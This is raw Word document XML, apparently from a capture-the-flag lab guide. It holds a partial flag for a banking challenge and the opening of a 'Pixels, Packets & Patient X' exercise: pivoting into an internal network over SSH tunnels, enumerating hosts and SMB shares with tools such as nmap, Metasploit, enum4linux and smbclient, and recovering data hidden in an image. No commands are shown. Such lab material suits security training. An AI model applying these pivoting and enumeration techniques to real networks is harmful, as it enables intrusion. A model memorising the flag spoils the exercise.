          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>pe</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>on</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040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4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nking 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</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1839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/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me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/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mo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/R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EAD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.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xt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nta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br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cr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mb</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1839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/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me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/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mo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/bank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ng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/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la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g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ge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_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x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s.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mp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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2199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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>FLA</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>2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– FL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G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{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_</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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nk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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ng_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spacing w:val="-3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ils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_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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002B4F4A" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/>
        <w:ind w:left="2199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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>C</w:t>
      </w:r>
      <w:r w:rsidRPr="002B4F4A">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>LUE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 xml:space="preserve">: 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 xml:space="preserve">ientX </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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spacing w:val="-3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ing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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 xml:space="preserve">ore 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n b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 xml:space="preserve">oken </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002B4F4A" w:rsidRPr="002B4F4A" w:rsidRDefault="002B4F4A" w:rsidP="002B4F4A">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2700"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b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sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRPr="002B4F4A" w:rsidRDefault="002B4F4A" w:rsidP="002B4F4A">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2700"/>
        </w:tabs>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9" w:rsidRPr="002B4F4A">
          <w:headerReference w:type="default" r:id="rId26"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="765" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Flag 3 –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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Pi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>els, P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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>e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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>&amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Patient</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>X</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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O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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>b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je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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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i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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>v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e</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="263" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1120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Pivot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into an internal n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twork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us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ing SSH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tun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elin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g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, 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u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m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erate live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y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3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24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m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3"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24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nd SMB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hare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, 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4"/>
          <w:szCs w:val="24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nd anal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y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z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e a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u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sp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i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ious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i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m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age file to u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over hid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4"/>
          <w:szCs w:val="24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en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da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a. Capture the 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m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bedded flag from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w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ithin the i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m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age.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="10" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>T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o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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ls &amp; T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>hn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iqu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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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 xml:space="preserve">s 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Y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ou’</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>l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 xml:space="preserve">l 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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>U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se</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="12"/>
          <w:szCs w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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SS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H T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eling &amp;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 xml:space="preserve"> Pr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oxy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 xml:space="preserve">ins – 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o pi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v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 xml:space="preserve">ot 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ugh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inte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 xml:space="preserve">l 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et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w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ork</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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sh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cr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 xml:space="preserve">ing – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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 xml:space="preserve">o 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uto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e inte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rn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 xml:space="preserve">l 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spacing w:val="-3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is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ove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y (p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ng sw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ep)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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 xml:space="preserve">p – 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n inte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 xml:space="preserve">l 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ystems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pacing w:val="-3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spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>g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pacing w:val="-3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un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el</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="51"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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et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sp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 xml:space="preserve">oit </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-4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er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 xml:space="preserve">– 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 xml:space="preserve">o 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in</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>g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erp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 xml:space="preserve">int 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spacing w:val="-3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v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ices</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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en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4linux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-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 xml:space="preserve">ng – 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en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er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 xml:space="preserve">e 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etBIOS</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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mes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es</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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sm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client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 xml:space="preserve">– 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 xml:space="preserve">o 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nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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explo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 xml:space="preserve">e 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 xml:space="preserve">ote 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s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="51"/>
        <w:ind w:left="144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w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="42"/>
          <w:w w:val="13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ore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 xml:space="preserve">t – </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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 xml:space="preserve">o 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ver h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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en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nt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nt em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ed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in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im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g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:spacing w:val="-3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s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="18" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pP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S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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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ep-b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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>y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-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>S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 xml:space="preserve">tep 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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>In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st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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>u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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>c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t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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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ons</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="14" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
